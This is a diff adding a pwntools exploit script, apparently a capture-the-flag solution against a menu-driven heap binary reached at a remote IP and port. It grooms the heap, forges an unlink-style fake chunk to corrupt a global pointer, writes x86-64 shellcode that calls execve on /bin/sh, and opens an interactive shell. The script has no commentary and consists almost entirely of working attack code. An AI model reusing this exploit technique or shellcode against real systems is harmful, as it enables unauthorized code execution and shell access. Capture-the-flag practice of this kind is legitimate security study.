@@ -1,0 +1,58 @@
+from pwn import *
+p=process("./timu")
+p=remote("111.198.29.45","46935")
+context.log_level='debug'
+
+def creat(size,data="\n"):
+    p.recvuntil(":")
+    p.sendline("1")
+    p.recvuntil(":")
+    p.sendline(str(size))
+    p.recvuntil(":")
+    p.send(data)
+
+def delete(idx):
+    p.recvuntil(":")
+    p.sendline("2")
+    p.recvuntil(":")
+    p.sendline(str(idx))
+
+def change(idx,size,data):
+    p.recvuntil(":")
+    p.sendline("3")
+    p.recvuntil(":")
+    p.sendline(str(idx))
+    p.recvuntil(":")
+    p.sendline(str(size))
+    p.recvuntil(":")
+    p.send(data) 
+
+creat(0x60+0x60+0x10)
+creat(0x60)
+delete(0)
+creat(0x60,'\xed\x1a')
+creat(0x60,'\xed\x1a')
+delete(3)
+delete(1)
+change(1,1,'\x00')
+# change(3,0x88,'a'*0x78+p64(0x71)+'\x00')
+creat(0x68)
+creat(0x68)
+creat(0x68)
+fake_chunk=p64(0)+p64(0xf1)
+fake_chunk+=p64(0x601078-0x18)+p64(0x601078-0x10)
+fake_chunk+='\x00'*(0xf0-0x20)
+fake_chunk+=p64(0xf0)+p64(0x100)
+creat(0xf8)
+creat(0xf8)
+creat(0x10)
+change(7,len(fake_chunk),fake_chunk)
+delete(8)
+change(6,0x13+8,'\x00'*0x13+p64(0x601060+0x20))
+shellcode='\x00'*0x20+"\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
+change(7,len(shellcode),shellcode)
+p.recvuntil(":")
+p.sendline("1")
+p.recvuntil(":")
+p.sendline("0")
+p.interactive()
